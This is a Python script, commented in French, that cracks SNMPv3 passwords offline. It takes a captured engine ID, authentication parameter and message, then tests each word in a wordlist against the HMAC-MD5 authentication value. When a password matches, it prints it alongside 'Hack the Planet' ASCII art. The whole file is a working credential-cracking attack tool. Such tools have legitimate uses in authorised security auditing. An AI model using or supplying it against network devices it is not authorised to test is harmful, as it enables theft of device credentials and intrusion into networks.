#!/usr/bin/python3
import hashlib
import time
import os
from tqdm import tqdm
from datetime import datetime, timedelta
from colorama import Fore, Back, Style, init

# Initialisation de Colorama
init(autoreset=True)

def calculate_md5(password, engine_id, msg_without_auth):
    """
    Calcule le HMAC-MD5 nécessaire pour vérifier le mot de passe.
    """
    password_len = len(password)
    if password_len == 0:
        return ""

    # Génère un buffer de mot de passe en répétant le mot de passe pour atteindre 1048576 octets
    password_buf = (password * (1048576 // password_len + 1))[:1048576]

    # Première passe MD5
    h = hashlib.md5()
    h.update(password_buf.encode('utf-8'))
    key = h.digest()

    # Deuxième passe MD5 avec engine_id
    strpass = key + engine_id + key
    h = hashlib.md5()
    h.update(strpass)
    key = h.hexdigest()

    # Préparation des clés étendues pour le HMAC
    extended_key = key + '00' * 48
    IPAD = '36' * 64
    k1 = "%0128x" % (int(extended_key, 16) ^ int(IPAD, 16))
    OPAD = '5c' * 64
    k2 = "%0128x" % (int(extended_key, 16) ^ int(OPAD, 16))

    # Calcul du HMAC-MD5
    input_data = k1 + msg_without_auth
    h = hashlib.md5()
    h.update(bytes.fromhex(input_data))
    input_data = h.hexdigest()
    input_data = k2 + input_data
    h = hashlib.md5()
    h.update(bytes.fromhex(input_data))
    input_data = h.hexdigest()

    return input_data[:24]  # Retourne les 24 premiers caractères hexadécimaux

def format_time(seconds):
    """
    Formate le temps en secondes en format européen (année, jours, heures, minutes, secondes).
    """
    td = timedelta(seconds=seconds)
    d = datetime(1, 1, 1) + td
    return f"{d.year-1} years {d.day-1} days {d.hour} hours {d.minute} minutes {d.second} seconds"

def crack_password(target_auth_param, wordlist_file, engine_id, msg_without_auth):
    """
    Tente de cracker le mot de passe en comparant le HMAC-MD5 calculé avec le paramètre d'authentification cible.
    Affiche une barre de progression avec une estimation du temps restant et un chronomètre.
    """
    start_time = time.time()

    with open(wordlist_file, 'rb') as fp:
        passwords = fp.read().splitlines()
        total_passwords = len(passwords)

        with tqdm(total=total_passwords, desc="Processing", ncols=100) as pbar:
            for count, password in enumerate(passwords, 1):
                try:
                    password = password.decode('utf-8')
                except UnicodeDecodeError:
                    continue  # Ignore les lignes qui ne peuvent pas être décodées en UTF-8

                ret = calculate_md5(password.strip(), engine_id, msg_without_auth)
                if target_auth_param == ret:
                    elapsed_time = time.time() - start_time
                    print(f"\nPassword found: {Fore.RED}{Back.WHITE}{password.strip()}{Style.RESET_ALL}")
                    print(f"Elapsed time: {format_time(elapsed_time)}")

                    # ASCII Art pour célébrer la découverte du mot de passe
                    print(Fore.GREEN + r"""
    \            _    _            _    
     \          | |  | |          | |   
      \\        | |__| | __ _  ___| | __
       \\       |  __  |/ _` |/ __| |/ /
        >\/7    | |  | | (_| | (__|   < 
    _.-(6'  \   |_|  |_|\__,_|\___|_|\_\
   (=___._/` \         _   _          
        )  \ |        | | | |         
       /   / |        | |_| |__   ___ 
      /    > /        | __| '_ \ / _ \
     j    < _\        | |_| | | |  __/
 _.-' :      ``.       \__|_| |_|\___|
 \ r=._\        `.
<`\\_  \         .`-.          _____  _                  _   _ 
 \ r-7  `-. ._  ' .  `\       |  __ \| |                | | | |
  \`,      `-.`7  7)   )      | |__) | | __ _ _ __   ___| |_| |
   \/         \|  \'  / `-._  |  ___/| |/ _` | '_ \ / _ \ __| |
              ||    .'        | |    | | (_| | | | |  __/ |_|_|
               \\  (          |_|    |_|\__,_|_| |_|\___|\__(_)
                >\  >
            ,.-' >.'
           <.'_.''
             <'            
                    """)

                    return password.strip()

                pbar.update(1)
                elapsed_time = time.time() - start_time
                avg_time_per_password = elapsed_time / count
                estimated_total_time = avg_time_per_password * (total_passwords - count)
                pbar.set_postfix_str(f"Elapsed Time: {format_time(elapsed_time)}")
                pbar.set_postfix_str(f"Est. Total Time: {format_time(estimated_total_time)}")

    elapsed_time = time.time() - start_time
    print("\nPassword not found.")
    print(f"Elapsed time: {format_time(elapsed_time)}")
    return None


def validate_hex_input(prompt):
    """
    Valide l'entrée utilisateur pour qu'elle soit une chaîne hexadécimale.
    """
    while True:
        value = input(prompt)
        if all(c in "0123456789abcdefABCDEF" for c in value):
            return value
        print("Error: Input must be a hexadecimal string.")

def get_wordlist_path():
    """
    Demande à l'utilisateur de fournir un chemin de fichier wordlist valide.
    """
    while True:
        wordlist_path = input("Enter the path to the wordlist file: ")
        if os.path.isfile(wordlist_path):
            return wordlist_path
        print(f"Error: Wordlist file '{wordlist_path}' not found. Please try again.")

if __name__ == "__main__":
    # Demande à l'utilisateur d'entrer les valeurs nécessaires
    msg_authoritative_engine_id = validate_hex_input("Enter 'msgAuthoritativeEngineID' (SNMP Agent ID): ")
    msg_authentication_parameters = validate_hex_input("Enter 'msgAuthenticationParameters' (Controls authenticity and message integrity): ")
    msg_whole = validate_hex_input("Enter 'msgWhole' (SNMPv3 whole message where msgAuthenticationParameters value is being replaced by 12 \\x00 bytes): ")
    wordlist_path = get_wordlist_path()

    # Conversion des entrées en hexadécimal
    engine_id = bytes.fromhex(msg_authoritative_engine_id)
    target_auth_param = msg_authentication_parameters
    msg_without_auth = msg_whole.replace(target_auth_param, "000000000000000000000000")

    # Appel de la fonction principale
    crack_password(target_auth_param, wordlist_path, engine_id, msg_without_auth)
